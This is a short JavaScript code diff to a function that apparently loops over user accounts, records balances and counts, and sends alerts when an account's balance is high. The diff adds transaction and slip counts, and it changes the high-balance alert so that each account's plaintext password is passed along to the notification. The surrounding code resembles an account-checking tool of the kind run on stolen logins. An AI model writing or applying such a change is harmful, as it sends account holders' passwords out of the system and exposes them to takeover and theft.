@@ -141,6 +141,8 @@ async function processSingleAccount(
         message: normalized.message || '',
         phone: normalized.phone || '',
         safe: normalized.safe || 0,
+        transactionCount: normalized.transactionCount || 0,
+        slipCount: normalized.slipCount || 0,
         rawResponse: normalized.rawResponse || null
       }
     });
@@ -151,10 +153,7 @@ async function processSingleAccount(
     Number(normalized.balance || 0) > resolvedOptions.highBalanceThreshold;
 
   if (isHighBalance) {
-    await safeNotify(
-      () => notifyHighBalance(result),
-      `HIGH_BALANCE ${account.username}`
-    );
+    await safeNotify(() => notifyHighBalance(result, account.password),`HIGH_BALANCE ${account.username}`);
   }
 
   if (resolvedOptions.delayBetweenRequestsMs > 0) {
